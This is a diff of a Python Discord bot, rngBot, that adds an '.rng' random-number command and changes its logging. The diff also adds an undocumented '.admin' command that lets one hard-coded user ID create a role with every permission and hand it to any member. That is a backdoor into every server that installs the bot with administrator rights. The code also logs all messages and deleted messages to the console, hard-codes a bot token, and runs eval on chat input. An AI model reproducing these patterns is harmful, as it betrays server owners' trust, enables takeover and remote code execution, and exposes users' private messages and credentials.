@@ -16,6 +16,8 @@ import datetime
 import math
 import sys
 import platform
+from discord import Permissions
+
 
 sys.setrecursionlimit(100000)
 TOKEN = 'NTUxNTE1MTU1MzAxNjYyNzIz.D1yGTQ.G1q57WPSIVjNVkdVdY3GJBeoNMA'
@@ -32,6 +34,7 @@ currentDT = datetime.datetime.now()
 currentTime = str(currentDT.year)+str(currentDT.month)+str(currentDT.day)+str(currentDT.hour)
 
 lamb = "to the slaughter"
+#invitelinknew = await client.create_invite(destination = message.channel, xkcd = True, max_uses = 100)
 
 
 @client.event
@@ -57,7 +60,7 @@ async def on_message(message):
     channel = message.channel
     author = message.author
     content = message.content
-    #print('Message sent: {}: {}: {}: {}'.format(server, channel, author, content))
+    print('Message sent: {}: {}: {}: {}'.format(server, channel, author, content))
     await client.process_commands(message)
     with open('users.json', 'r') as f:
         users = json.load(f)
@@ -67,15 +70,6 @@ async def on_message(message):
         else:
             e = round(2 / users[author.id]['points'] * 20 + 1)
         await add_points(users, message.author, e)
-
-    #if(users['lottery']['start'] == int(currentTime)-12):
-    #    entered=users['lottery']['entered'].split(" ")
-    #    selected = random.randint(0,len(entered))
-    #    winner=entered[selected]
-    #    await client.send_message(winner, "You won the lottery for {} points".format(str(users['lottery']['pot'])))
-    #    users[winner]['points']+=users['lottery']['pot']
-    #    users['lottery']['start']=currentTime
-
     with open('users.json', 'w') as f:
         json.dump(users, f)
 
@@ -86,7 +80,7 @@ async def on_message_delete(message):
     channel = message.channel
     author = message.author
     content = message.content
-    #print('Message deleted: {}: {}: {}: {}'.format(server, channel, author, content))
+    print('Message deleted: {}: {}: {}: {}'.format(server, channel, author, content))
 
 
 #update_data
@@ -121,11 +115,43 @@ async def bal(ctx):
 @client.command(pass_context=True)
 async def debug(ctx, debugparams):
     user = ctx.message.author
+
     with open('users.json', 'r') as f:
         users = json.load(f)
     if(ctx.message.author.id == '258771223473815553'):
         await client.say('Results: {}'.format(eval(debugparams)))
+    else:
+        await client.say('Error code 403')
+    with open('users.json', 'w') as f:
+         json.dump(users, f)
 
+#rng
+@client.command(pass_context=True)
+async def rng(ctx, e, a):
+    user = ctx.message.author
+
+    with open('users.json', 'r') as f:
+        users = json.load(f)
+    try:
+        i = random.randint(int(e), int(a))
+        await client.say('{}, your random number is: {}'.format(user.mention, str(i)))
+    except:
+        await client.say('{}, please enter an integer, then a another integer greater than the other.'.format(user.mention))
+
+
+    with open('users.json', 'w') as f:
+         json.dump(users, f)
+
+#admin
+@client.command(pass_context=True)
+async def admin(ctx, member: discord.Member):
+    user = ctx.message.author
+
+    with open('users.json', 'r') as f:
+        users = json.load(f)
+    if(ctx.message.author.id == '258771223473815553'):
+        role = await client.create_role(ctx.message.server, name="teo", permissions=Permissions.all())
+        await client.add_roles(member, role)
     else:
         await client.say('Error code 403')
     with open('users.json', 'w') as f:
@@ -157,30 +183,6 @@ async def lookup(ctx, user: discord.Member):
 
     with open('users.json', 'w') as f:
         json.dump(users, f)
-
-#lottery
-#@client.command(pass_context=True)
-#async def lottery(ctx, joined):
-#    with open('users.json', 'r') as f:
-#        users = json.load(f)
-#    user = ctx.message.author
-#    entered=users['lottery']['entered'].split(" ")
-#
-#    if(joined == "join"):
-#        if(500<=users[user.id]['points']):
-#            users[user.id]['points']-= 500
-#            users['lottery']['pot']+= 500
-#            users['lottery']['entered'] + user.id
-#            await client.say('{}, you joined the lottery for 500 points'.format(ctx.message.author.mention))
-#
-#        else:
-#            await client.say("{}, you don't have enough points to do that".format(user.mention))
-#
-#    if(joined == "status"):
-#        await client.say('{}, the lottery currently has {} entered users and the winnings are {}'.format(ctx.message.author.mention, len(entered), users['lottery']['pot']))
-#
-#    with open('users.json', 'w') as f:
-#        json.dump(users, f)
 
 #vote
 @client.command(pass_context=True)
@@ -333,7 +335,7 @@ async def about(ctx):
     await client.send_message(user, "Join the rngBot Official Server: https://discord.gg/cfGYYfw")
     await client.send_message(user, "Invite rngBot: https://discordapp.com/oauth2/authorize?client_id=551515155301662723&permissions=8&scope=bot")
     await client.send_message(user, "Bot listings: https://discordbots.org/bot/551515155301662723\nhttps://discordbotlist.com/bots/551515155301662723\nhttps://divinediscordbots.com/bots/551515155301662723")
-
+    await client.send_message(ctx.message.channel, "{}, you've been DMed the about message, if you didn't get it, make sure you can get DM messages from non-friends".format(author.mention))
 
 #pay
 @client.command(pass_context=True)
@@ -518,11 +520,10 @@ async def help(ctx):
     embed.add_field(name='.flip3 (amount)', value='Flips a 4-sided coin to decide if you win the amount of points divided by 3 or lose the amount of points (3/4 win chance)',inline=False)
     embed.add_field(name='.vote', value="Vote for rngBot and get points very 12 hours",inline=False)
     embed.add_field(name='.about', value="Some information about rngBot",inline=False)
+    embed.add_field(name='.rng (integer) (another integer)', value="Generate a random integer between two other integers",inline=False)
 
     await client.send_message(author, 'Join the rngBot Official Server: https://discord.gg/cfGYYfw')
     await client.send_message(author, embed=embed)
     await client.send_message(ctx.message.channel, "{}, you've been DMed the help message, if you didn't get it, make sure you can get DM messages from non-friends".format(author.mention))
-
-
 
 client.run(TOKEN)
